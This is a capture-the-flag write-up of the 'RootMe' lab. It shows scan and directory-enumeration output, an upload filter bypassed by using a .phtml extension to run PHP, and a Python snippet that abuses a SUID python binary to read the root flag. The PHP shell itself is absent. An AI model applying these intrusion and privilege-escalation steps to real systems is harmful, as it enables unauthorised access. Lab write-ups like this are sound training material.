# RootMe

```{sh}
>> nmap 10.10.240.217 -sV

Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-17 09:58 CET
Nmap scan report for 10.10.240.217
Host is up (0.049s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.76 seconds

```


```{sh}
>>  gobuster dir -u http://10.10.240.217 -w ../../Tools/SecLists/Discovery/

Web-Content/common.txt 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.240.217
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../../Tools/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2024/02/17 10:03:13 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.240.217/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 311] [--> http://10.10.240.217/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.240.217/panel/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.240.217/uploads/]
Progress: 4625 / 4712 (98.15%)
===============================================================
2024/02/17 10:03:37 Finished
===============================================================

```

I can upload files, but not all types.

- idea: see if apache 2.2.49 has any known vulnerabilities (so far no luck)

- idea: check for other types of files that can be server side executed: 

    html    allowed     : served
    php     prohibited  : executed ?
    py      allowed     : downloaded
    asp     allowed     : downloaded
    jsp     allowed     : served
    perl    allowed     : downloaded

    conclustion: not different ones for now
    - idea: how do i circumvent the prohibition? after trying some things with burp suite, i thought it is probably only checking the extension, so php is no go.
    
    other related types to php: phtml ---> executes as php :) 

So now we can execute php code. The original idea was to use a direct reverse shell, but since i was unable to get it working, i used a php shell instead. 

```{php}


```{sh}
>> 'find / -type f -name "user.txt" 2>/dev/null'
>> 'cat /var/www/user.txt'
```

After this and by using the following command, i got the unsafe executable file:

```{sh}
>> find / -type f -perm /u+s -exec ls -la {} \;

...
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
...

```


so /usr/bin/python has the suid set. By executing the following command, i got the root flag:

```{py}

import subprocess

subprocess.call(['find', '/','-type', 'f', '-name', 'root.txt'])
subprocess.call(['cat','/root/root.txt'])

```

(since this calls fork and exec, the suid bit is not dropped (which happened for me with os.system)), and since the python binary is owned by root, the root flag is printed.

Actually, this room made me decide on working in a simple php shell that worked in the browser, since i still was unable to get the reverse shell working (the shell not being able to reach me back). I will try to get the reverse shell working in the next room, but as a last resort, i will use the php shell again. You can find it in /Tools/soften/self_made/shell.php
